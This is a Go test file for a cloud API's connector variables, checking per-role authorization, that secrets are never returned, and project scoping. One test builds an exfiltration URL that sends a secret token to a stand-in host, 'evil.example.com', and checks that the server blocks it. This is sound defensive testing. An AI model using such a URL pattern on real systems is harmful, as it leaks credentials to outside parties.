// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (c) 2026 Arturo (AutoHost)

package handler_test

import (
	"context"
	"net/http"
	"strings"
	"sync"
	"testing"

	"github.com/arturo/autohost-cloud-api/internal/core/connectors"
)

type connVarRepo struct {
	mu    sync.Mutex
	items map[string]*connectors.Variable
}

func newConnVarRepo() *connVarRepo { return &connVarRepo{items: map[string]*connectors.Variable{}} }

func (m *connVarRepo) ListVariables(_ context.Context, projectID string) ([]*connectors.Variable, error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	var out []*connectors.Variable
	for _, v := range m.items {
		if v.ProjectID == projectID {
			cp := *v
			out = append(out, &cp)
		}
	}
	return out, nil
}
func (m *connVarRepo) GetVariable(_ context.Context, id string) (*connectors.Variable, error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	v, ok := m.items[id]
	if !ok {
		return nil, connectors.ErrVariableNotFound
	}
	cp := *v
	return &cp, nil
}
func (m *connVarRepo) CreateVariable(_ context.Context, v *connectors.Variable) (*connectors.Variable, error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	cp := *v
	m.items[v.ID] = &cp
	out := cp
	return &out, nil
}
func (m *connVarRepo) UpdateVariable(ctx context.Context, v *connectors.Variable) (*connectors.Variable, error) {
	return m.CreateVariable(ctx, v)
}
func (m *connVarRepo) DeleteVariable(_ context.Context, id string) error {
	m.mu.Lock()
	defer m.mu.Unlock()
	delete(m.items, id)
	return nil
}

func TestConnectorVariableAuthzMatrix(t *testing.T) {
	f := newConnFixture(t)
	a, b := "/v1/connector-variables/"+f.varA.ID, "/v1/connector-variables/"+f.varB.ID
	plain := func(project string) map[string]any {
		return map[string]any{"project_id": project, "name": "ZONE", "value": "z"}
	}
	cases := []struct {
		name, method, path string
		body               any
		want               map[string]int
	}{
		{"list", http.MethodGet, "/v1/connector-variables/?project_id=" + projA, nil,
			map[string]int{"owner": 200, "editor": 200, "viewer": 403, "operator": 403, "outsider": 404}},
		{"list without project", http.MethodGet, "/v1/connector-variables/", nil, map[string]int{"owner": 400}},
		{"get", http.MethodGet, a, nil, map[string]int{"editor": 200, "viewer": 403, "operator": 403, "outsider": 404}},
		{"other project's variable", http.MethodGet, b, nil, map[string]int{"owner": 404, "editor": 404, "outsider": 200}},
		{"unknown id", http.MethodGet, "/v1/connector-variables/not-a-uuid", nil, map[string]int{"owner": 404}},
		{"create", http.MethodPost, "/v1/connector-variables/", plain(projA),
			map[string]int{"viewer": 403, "operator": 403, "outsider": 404}},
		{"create in other project", http.MethodPost, "/v1/connector-variables/", plain(projB), map[string]int{"editor": 404}},
		{"update", http.MethodPut, a, map[string]any{"name": "TOKEN", "secret": true, "allowed_origins": []string{f.upstreamURL}},
			map[string]int{"viewer": 403, "operator": 403, "outsider": 404, "editor": 200}},
		{"delete", http.MethodDelete, b, nil, map[string]int{"owner": 404, "editor": 404}},
	}
	for _, c := range cases {
		for user, want := range c.want {
			if rec := f.do(t, user, c.method, c.path, c.body); rec.Code != want {
				t.Errorf("%s as %s: status %d, want %d (%s)", c.name, user, rec.Code, want, rec.Body.String())
			}
		}
	}
}

func TestConnectorVariableSecretNeverReturned(t *testing.T) {
	f := newConnFixture(t)
	for _, path := range []string{"/v1/connector-variables/?project_id=" + projA, "/v1/connector-variables/" + f.varA.ID} {
		body := f.do(t, "owner", http.MethodGet, path, nil).Body.String()
		if strings.Contains(body, "var-secret-A") || strings.Contains(body, "v1:") || !strings.Contains(body, `"has_value":true`) {
			t.Errorf("%s: %s", path, body)
		}
	}
}

// An editor cannot use a secret variable to send it to a server of their choice, neither by saving a
// connector nor with the test endpoint, nor by adding an origin to the variable without its value.
func TestConnectorVariableCannotBeExfiltrated(t *testing.T) {
	f := newConnFixture(t)
	def := definitionBody(projA)
	def["url"] = "https://evil.example.com/collect?t={{vars.TOKEN}}"
	hits := *f.upstreamHits
	if rec := f.do(t, "editor", http.MethodPost, "/v1/connectors/", def); rec.Code != http.StatusBadRequest {
		t.Errorf("create: status %d, want 400 (%s)", rec.Code, rec.Body.String())
	}
	if rec := f.do(t, "editor", http.MethodPost, "/v1/connectors/test", map[string]any{"connector": def}); rec.Code != http.StatusBadRequest {
		t.Errorf("test: status %d, want 400 (%s)", rec.Code, rec.Body.String())
	}
	addOrigin := map[string]any{"name": "TOKEN", "secret": true, "allowed_origins": []string{f.upstreamURL, "https://evil.example.com"}}
	if rec := f.do(t, "editor", http.MethodPut, "/v1/connector-variables/"+f.varA.ID, addOrigin); rec.Code != http.StatusBadRequest {
		t.Errorf("add origin: status %d, want 400 (%s)", rec.Code, rec.Body.String())
	}
	reveal := map[string]any{"name": "TOKEN", "secret": false}
	if rec := f.do(t, "editor", http.MethodPut, "/v1/connector-variables/"+f.varA.ID, reveal); rec.Code != http.StatusBadRequest {
		t.Errorf("make plain: status %d, want 400 (%s)", rec.Code, rec.Body.String())
	}
	if *f.upstreamHits != hits {
		t.Error("the external API was called")
	}
}

// A connector uses the variables of its own project: project B's editor cannot reach A's token by name.
func TestConnectorVariablesAreProjectScoped(t *testing.T) {
	f := newConnFixture(t)
	def := definitionBody(projB)
	def["url"] = f.upstreamURL + "/x"
	def["headers"] = []map[string]string{{"name": "Authorization", "value": "Bearer {{vars.TOKEN}}"}}
	rec := f.do(t, "outsider", http.MethodPost, "/v1/connectors/test", map[string]any{"connector": def})
	if rec.Code != http.StatusOK || strings.Contains(rec.Body.String(), "var-secret-A") {
		t.Fatalf("status %d: %s", rec.Code, rec.Body.String())
	}
}

func TestConnectorVariableInUseIs409(t *testing.T) {
	f := newConnFixture(t)
	def := definitionBody(projA)
	def["url"] = f.upstreamURL + "/x?t={{vars.TOKEN}}"
	if rec := f.do(t, "editor", http.MethodPost, "/v1/connectors/", def); rec.Code != http.StatusCreated {
		t.Fatalf("create: %d %s", rec.Code, rec.Body.String())
	}
	if rec := f.do(t, "editor", http.MethodDelete, "/v1/connector-variables/"+f.varA.ID, nil); rec.Code != http.StatusConflict {
		t.Errorf("delete in use: status %d, want 409 (%s)", rec.Code, rec.Body.String())
	}
}
